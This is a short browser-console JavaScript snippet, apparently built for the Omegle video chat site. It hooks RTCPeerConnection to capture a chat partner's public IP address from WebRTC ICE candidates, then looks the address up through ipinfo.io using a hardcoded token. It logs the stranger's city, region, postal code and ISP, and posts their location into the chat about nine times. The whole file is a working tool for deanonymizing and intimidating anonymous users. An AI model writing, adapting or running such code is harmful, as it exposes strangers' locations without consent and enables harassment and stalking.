window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection

window.RTCPeerConnection = function(...args) {
 const omegleLocator = new window.oRTCPeerConnection(...args)

omegleLocator.oaddIceCandidate = omegleLocator.addIceCandidate

omegleLocator.addIceCandidate = function(iceCandidate, ...rest) {
 const file = iceCandidate.candidate.split(' ')

if (file[7] === 'srflx') {
console.clear()
fetchLocation(file[4])
}
return omegleLocator.oaddIceCandidate(iceCandidate, ...rest)

}

return omegleLocator
}


function fetchLocation(ip)
{
	fetch('https://ipinfo.io/'+ip+'?token=dbffa735c63660')
	.then( res => res.json() )
	.then(response => {
		console.log("Country :"+response.country)
		console.log("State : "+response.region)
		console.log("City : " +response.city)
		console.log("Pin Code : " +response.postal)
		console.log("Org : " +response.org)

		writeMessage(response.country,response.region,response.city)
	}) 
	.catch(error => console.error('Error:', error));
}


function writeMessage(country,region,city)
{
	let chatmsg = document.getElementsByClassName("chatmsg");
	let sendbtn = document.getElementsByClassName("sendbtn");
	let msg = "City : "+city+ ", Region : "+region+", Country : "+country+".";
	for(let i=1; i<10; i++)
	{
		chatmsg[0].innerHTML = msg;
	sendbtn[0].click();
	}
	
}
